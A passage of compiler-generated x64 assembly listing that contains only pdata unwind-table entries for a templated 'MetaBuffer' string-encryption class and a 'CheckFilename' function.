pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+752
	DD	imagerel $unwind$??0?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1088
	DD	imagerel $unwind$??0?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DN@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+836
	DD	imagerel $unwind$??0?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckFilename@@YAHPEB_W@Z DD imagerel $LN8
	DD	imagerel $LN8+449
	DD	imagerel $unwind$?CheckFilename@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0HB@$0GO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1004
	DD	imagerel $unwind$??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
